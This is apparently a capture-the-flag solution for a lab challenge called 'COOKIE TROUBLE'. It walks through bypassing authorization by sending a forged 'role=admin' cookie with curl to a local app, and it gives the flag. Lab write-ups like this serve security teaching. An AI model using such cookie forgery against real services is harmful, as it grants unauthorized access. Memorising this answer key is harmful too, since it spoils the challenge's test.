Solution: I08 - COOKIE TROUBLE

Concept  
Client-side cookie tampering and authorization bypass.

Walkthrough  
1. Review `challenge/app/app.py`.
2. Notice the application grants access when `cookies.get('role') == 'admin'`.
3. Send an HTTP GET request with the modified cookie:
   ```bash
   curl -H "Cookie: role=admin" http://localhost:5000/
   ```
4. The server returns `cookie admin access`.

Flag  
`cookie admin access`
